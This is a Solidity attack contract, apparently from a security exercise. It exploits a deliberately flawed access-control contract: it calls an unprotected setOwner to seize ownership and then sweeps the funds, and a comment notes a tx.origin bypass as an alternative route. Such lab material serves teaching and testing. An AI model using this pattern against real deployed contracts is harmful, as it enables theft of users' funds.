// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {FlawedAccessControl} from "../src/FlawedAccessControl.sol";

contract AccessAttack {
    FlawedAccessControl public target;

    constructor(address _target) {
        target = FlawedAccessControl(_target);
    }

    function pwn() external {
        // Path 1: setOwner has no access control
        target.setOwner(address(this));
        // Path 2 (alternative): tx.origin bypass — caller must be owner EOA
        // target.transferOwnership(address(this));
        target.sweep();
    }

    receive() external payable {}
}